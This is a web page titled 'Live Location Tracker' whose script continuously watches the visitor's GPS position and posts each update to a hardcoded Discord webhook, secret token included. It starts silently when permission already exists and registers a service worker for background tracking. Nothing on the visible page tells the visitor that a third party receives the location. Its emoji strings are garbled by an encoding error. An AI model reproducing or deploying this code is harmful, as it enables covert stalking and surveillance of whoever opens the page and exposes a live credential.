<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Location Tracker</title>
    <link rel="stylesheet" href="styles.css">
</head>

<body>
    <h2>Live Location Tracker</h2>
    <p id="status">Waiting for location access...</p>
    <button id="requestLocation">Enable Location Access</button>

    <script>
        document.addEventListener("DOMContentLoaded", () => {
            console.log("âœ… Page loaded, checking location permissions...");

            if (!navigator.geolocation) {
                alert("âŒ Geolocation is not supported by this browser.");
                return;
            }

            function sendLocation(latitude, longitude) {
             const payload = {
                content: `ðŸ“ **New Location Update:**\nðŸŒ **Latitude:** ${latitude}\nðŸ—ºï¸
                 **Longitude:** ${longitude}\nðŸ”— [View on Google Maps](https://www.google.com/maps/place/${latitude},${longitude})`
                };

    fetch("https://discord.com/api/webhooks/1337946103924133898/eudcofLWR_ryLQivFc1hgFf2v01Fy9RSIQJxd5G1Qo5VGeyWOtVKR5E-t-mr-XddLL1X", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`ðŸš¨ Webhook failed: ${response.status} ${response.statusText}`);
        }
        console.log("âœ… Location sent successfully!");
    })
    .catch(error => console.error("ðŸš¨ Error sending location:", error));
}



                function startTracking() {
                    navigator.geolocation.watchPosition(
                    (position) => {
                        const { latitude, longitude } = position.coords;
                        document.getElementById("status").innerText = `ðŸ“ Location: ${latitude}, ${longitude}`;
                        sendLocation(latitude, longitude);
                    },
                    (error) => console.error("ðŸš¨ Location error:", error.message),
                    {
                        enableHighAccuracy: true,  // âœ… Uses GPS for maximum accuracy
                        timeout: 5000,             // â³ Lower timeout to refresh faster
                        maximumAge: 0              // â²ï¸ Prevents cached locations
                    }
                    );
            }
            document.getElementById("requestLocation").addEventListener("click", () => {
                startTracking();
                document.getElementById("requestLocation").style.display = "none"; 
            });

            // Automatically start tracking if the user has already granted permission
            navigator.permissions.query({ name: "geolocation" }).then((permissionStatus) => {
                if (permissionStatus.state === "granted") {
                    startTracking();
                    document.getElementById("requestLocation").style.display = "none";
                } else {
                    document.getElementById("requestLocation").style.display = "block";
                }
            });
        });

        // Register the Service Worker for background tracking
        if ("serviceWorker" in navigator) {
                navigator.serviceWorker.register("service-worker.js")
                    .then((registration) => {
                        console.log("âœ… Service Worker registered:", registration.scope);
                    })
                    .catch((error) => {
                        console.error("ðŸš¨ Service Worker registration failed:", error);
                    });
            }
    </script>
    <script src="locationWorker.js"></script>
    
</body>
</html>
